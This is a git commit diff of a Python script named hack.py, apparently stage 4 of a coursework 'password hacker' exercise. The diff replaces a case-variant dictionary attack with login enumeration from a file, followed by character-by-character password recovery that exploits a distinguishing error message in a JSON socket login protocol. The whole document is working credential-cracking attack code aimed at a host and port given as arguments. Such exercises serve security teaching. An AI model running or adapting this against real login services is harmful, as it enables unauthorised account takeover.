522ab0e86668b0681554509b1b30ed0d4631b58e
Konstantin <mr.kkaminsky@list.ru>
2020-05-13 22:09:12 +0500

    stage 4/5

--- hack.py
+++ hack.py
@@ -1,13 +1,31 @@
 import sys
 import socket
 import string
-import itertools
+import json
+
+
+def get_pass(login, letters=""):
+    alpha = string.ascii_letters + string.digits
+    for ch in alpha:
+        json_string1 = json.dumps({"login": login, "password": letters + ch})
+        client_socket.send(json_string1.encode())
+        response1 = client_socket.recv(1024)
+        response1 = response1.decode()
+        decoded_data1 = json.loads(response1)
+        if decoded_data1["result"] == "Exception happened during login":
+            return get_pass(login, letters + ch)
+        elif decoded_data1["result"] == "Wrong password!":
+            continue
+        elif decoded_data1["result"] == "Connection success!":
+            return json_string1
+        else:
+            return "Something wrong"
+
 
 args = sys.argv
 
 host = args[1]
 port = int(args[2])
-
 
 client_socket = socket.socket()
 
@@ -15,24 +33,19 @@ address = (host, port)
 
 client_socket.connect(address)
 
-file = open("passwords.txt", "r")
-passwords = file.read().splitlines()
+file = open("logins.txt", "r")
+logins = file.read().splitlines()
+
 file.close()
 
-found_pass = "Not found"
-
-for password in passwords:
-    for pas in map(''.join, itertools.product(*((c.upper(), c.lower()) for c in password))):
-        client_socket.send(pas.encode())
-        response = client_socket.recv(1024)
-        response = response.decode()
-        if response == "Connection success!":
-            found_pass = pas
-            break
-    else:
-        continue
-    break
-
-print(found_pass)
+for login in logins:
+    json_string = json.dumps({"login": login, "password": ""})
+    client_socket.send(json_string.encode())
+    response = client_socket.recv(1024)
+    response = response.decode()
+    decoded_data = json.loads(response)
+    if decoded_data["result"] == "Wrong password!" or decoded_data["result"] == "Exception happened during login":
+        print(get_pass(login))
+        break
 
 client_socket.close()
